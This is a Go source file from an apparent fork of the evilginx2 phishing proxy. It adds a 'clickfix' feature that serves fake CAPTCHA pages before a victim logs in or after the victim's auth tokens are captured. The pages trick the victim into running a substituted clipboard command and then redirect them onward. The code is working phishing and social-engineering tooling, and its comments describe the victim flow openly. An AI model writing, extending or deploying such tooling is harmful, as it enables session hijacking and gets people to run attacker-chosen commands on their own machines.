// evilginx2-extended (fork): clickfix — fake-captcha gate serving.
//
// Loads self-contained HTML templates from clickfix/templates/<name>.html
// (gitignored — campaign-specific, deployed alongside phishlets), substitutes
// the {command} payload, and serves them at two hook points:
//
//   position=before → at the lure redirector position (pre-login gate)
//   position=after  → replacing the post-completion JS redirect
package core

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/elazarl/goproxy"
	"github.com/kgretzky/evilginx2/log"
)

// clickFixTemplateDir returns the directory containing clickfix templates,
// resolved as a sibling of the redirectors directory.
func (p *HttpProxy) clickFixTemplateDir() string {
	return filepath.Join(filepath.Dir(p.cfg.GetRedirectorsDir()), "clickfix", "templates")
}

// loadClickFixTemplate reads and returns the raw template HTML.
func (p *HttpProxy) loadClickFixTemplate(name string) (string, error) {
	if name == "" {
		return "", fmt.Errorf("clickfix: no template name")
	}
	dir := p.clickFixTemplateDir()
	path := filepath.Join(dir, name+".html")
	abs, err := filepath.Abs(path)
	if err != nil || !strings.HasPrefix(abs, dir) {
		return "", fmt.Errorf("clickfix: invalid template name")
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return "", fmt.Errorf("clickfix: template %q not found (deploy to %s): %v",
			name, dir, err)
	}
	return string(data), nil
}

// renderClickFix substitutes the {command} placeholder with the payload.
// {lure_url_html}, {lure_url_js} and custom params are substituted by the
// existing replaceHtmlParams mechanism downstream.
func renderClickFix(tmpl, command string) string {
	return strings.ReplaceAll(tmpl, "{command}", command)
}

// serveClickFixBefore serves the clickfix gate at the lure path (pre-login).
// The victim sees the fake captcha, runs the clipboard payload, clicks verify,
// and gets forwarded via {lure_url_js} to the actual login flow.
func (p *HttpProxy) serveClickFixBefore(req *http.Request, cf *ClickFix, lure_url string, params *map[string]string) (*http.Request, *http.Response) {
	tmpl, err := p.loadClickFixTemplate(cf.Template)
	if err != nil {
		log.Warning("%v — falling back to normal redirect", err)
		return req, nil
	}
	body := renderClickFix(tmpl, cf.Command)
	body = p.replaceHtmlParams(body, lure_url, params)
	log.Info("clickfix: serving pre-auth gate (%s) [%s]", cf.Template, req.RemoteAddr)
	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
	return req, resp
}

// serveClickFixAfter serves the clickfix gate after all auth tokens are
// captured, replacing the normal JS redirect. The victim sees a "one more
// step" captcha, runs the clipboard payload, clicks verify, and gets sent
// to the real site.
func (p *HttpProxy) serveClickFixAfter(req *http.Request, cf *ClickFix, redirectUrl string) (*http.Request, *http.Response) {
	tmpl, err := p.loadClickFixTemplate(cf.Template)
	if err != nil {
		log.Warning("%v — falling back to normal redirect", err)
		return p.javascriptRedirect(req, redirectUrl)
	}
	body := renderClickFix(tmpl, cf.Command)
	body = strings.ReplaceAll(body, "{redirect_url}", redirectUrl)
	log.Info("clickfix: serving post-auth gate (%s) [%s]", cf.Template, req.RemoteAddr)
	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
	return req, resp
}
